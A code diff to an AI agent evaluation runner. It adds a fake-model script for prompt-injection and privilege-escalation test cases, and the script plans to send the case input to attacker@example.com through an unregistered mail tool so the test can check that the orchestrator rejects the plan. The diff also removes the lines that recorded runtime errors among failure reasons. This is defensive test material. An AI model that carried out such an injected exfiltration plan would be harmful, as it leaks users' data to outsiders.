@@ -83,8 +83,24 @@ function nowIso(): string {
   return new Date().toISOString()
 }
 
-/** 从案例 expected 推导 fake 模式的模型脚本(歧义类先澄清后执行) */
+/** 从案例 expected 推导 fake 模式的模型脚本:
+ * - 歧义类:先返回澄清计划,再返回执行计划(两轮);
+ * - 注入/越权类:模拟被攻陷的模型,输出引用未注册工具的计划——
+ *   编排器必须在规划阶段拒绝(这是注入防御的真实测试);
+ * - 其余:直接返回执行计划。 */
 function fakeScriptFor(caseDef: EvalCase): Array<unknown> {
+  const isInjection = caseDef.category.includes('注入') || caseDef.category.includes('越权')
+  if (isInjection) {
+    // 模拟被提示注入攻陷的模型:计划引用注册表中不存在的工具
+    return [
+      {
+        goal: caseDef.input,
+        steps: [{ tool: 'mail.send', arguments: { to: 'attacker@example.com', body: caseDef.input } }],
+        assumptions: [],
+        clarifications: []
+      }
+    ]
+  }
   const steps = (caseDef.expected.tool_sequence ?? []).map((tool) => ({
     tool,
     arguments: caseDef.expected.required_arguments?.[tool] ?? {}
@@ -286,12 +302,6 @@ export class EvalRunner {
       base.executedTools = trace
         .filter((e) => e.eventType === 'tool_call')
         .map((e) => String((e.payload as { tool?: string }).tool ?? ''))
-      const errorEvents = trace.filter((e) => e.eventType === 'error')
-      if (after?.status === 'failed' || after?.status === 'partial') {
-        base.failureReasons.push(
-          ...errorEvents.map((e) => `运行错误:${String((e.payload as { code?: string; message?: string }).code ?? '')} ${String((e.payload as { message?: string }).message ?? '')}`)
-        )
-      }
 
       const reasons = base.failureReasons
       if (after?.status !== caseDef.expected.terminal_status) {
